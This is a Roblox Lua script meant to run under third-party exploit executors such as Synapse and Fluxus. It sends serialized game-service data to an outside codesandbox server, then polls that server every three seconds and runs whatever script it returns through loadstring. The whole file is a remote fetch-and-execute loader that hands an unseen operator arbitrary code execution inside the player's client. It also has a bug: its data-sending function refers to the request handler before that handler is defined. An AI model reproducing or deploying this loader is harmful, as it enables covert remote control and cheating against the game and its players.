local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local SERVER = "https://jn5t96-3000.csb.app"
local lastExecutedScriptContent = nil  -- Keep track of the last executed script content

-- Utility: Serialize instance properties
local function serializeProperties(inst)
    local props = {}
    local properties = {
        "Name", "ClassName", "Parent", "Archivable", "Anchored", "CanCollide", "Transparency",
        "Position", "Size", "Rotation", "Velocity", "Color", "Material", "CFrame", "PrimaryPart", 
        "Orientation", "Health", "WalkSpeed", "JumpHeight", "BrickColor"
    }

    for _, prop in ipairs(properties) do
        local success, val = pcall(function() return inst[prop] end)
        if success then
            -- Serialize complex types like Color3, Vector3, and CFrame
            if typeof(val) == "Color3" then
                props[prop] = tostring(val)
            elseif typeof(val) == "Vector3" then
                props[prop] = tostring(val)
            elseif typeof(val) == "CFrame" then
                props[prop] = tostring(val)
            elseif typeof(val) == "BrickColor" then
                props[prop] = tostring(val)
            else
                props[prop] = val
            end
        end
    end
    return props
end

-- Send initial instance data to server
local function sendInitialInstanceData()
    local initialInstances = {
        "Workspace", "Players", "Lighting", "ReplicatedFirst", 
        "ReplicatedStorage", "StarterGui", "StarterPack", "StarterPlayer", 
        "SoundService", "Chat", "HttpService", "UserInputService", 
        "TweenService", "GuiService", "CoreGui"
    }

    local updates = {}

    for _, path in ipairs(initialInstances) do
        local instance = game:GetService(path)  -- Using GetService to safely fetch services
        if instance then
            updates[path] = serializeProperties(instance)
        end
    end

    local json = HttpService:JSONEncode(updates)
    pcall(function()
        httpRequest({
            Url = SERVER .. "/instance_data",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end)
end

-- HTTP Request method selection
local HttpRequestMethods = {
    syn = syn and syn.request,
    http = http and http.request,
    fluxus = fluxus and fluxus.request,
    default = request or http_request
}

local httpRequest = HttpRequestMethods[syn and "syn" or http and "http" or fluxus and "fluxus" or "default"]

if not httpRequest then
    warn("❌ No supported HTTP request method found.")
    return
end

-- Check for new script by comparing raw script content
local function checkScript()
    local res, err = pcall(function()
        return httpRequest({
            Url = SERVER .. "/latest",  -- Fetch the latest script content (raw script)
            Method = "GET",
            Headers = {["Content-Type"] = "application/json"}
        })
    end)

    if res then
        -- Debugging: Check the response content
        print("Response body: " .. tostring(err.Body))  -- Add this line to debug
        local currentScriptContent = err.Body  -- This is the raw script content

        -- Debugging: Print current script content
        print("Current script content: " .. currentScriptContent)

        -- Check if the script content is different from the last executed one
        if currentScriptContent ~= lastExecutedScriptContent then
            lastExecutedScriptContent = currentScriptContent  -- Update the last executed script content

            local fn, err = loadstring(currentScriptContent)  -- Load the new script content
            if fn then
                local ok, execErr = pcall(fn)
                if not ok then
                    warn("[Script] Runtime error:", execErr)
                end
            else
                warn("[Script] Load error:", err)
            end
        else
            print("No new script to execute.")
        end
    else
        -- If there's an error in the request, print it for debugging
        warn("[Script] Failed to fetch latest.lua:", err)
    end
end

-- Main loop: sync props + script updates
task.spawn(function()
    while true do
        checkScript()  -- Check for new script
        task.wait(3)   -- Adjust the polling interval as needed
    end
end)

-- Send initial instance data (regular instances) when script starts
sendInitialInstanceData()
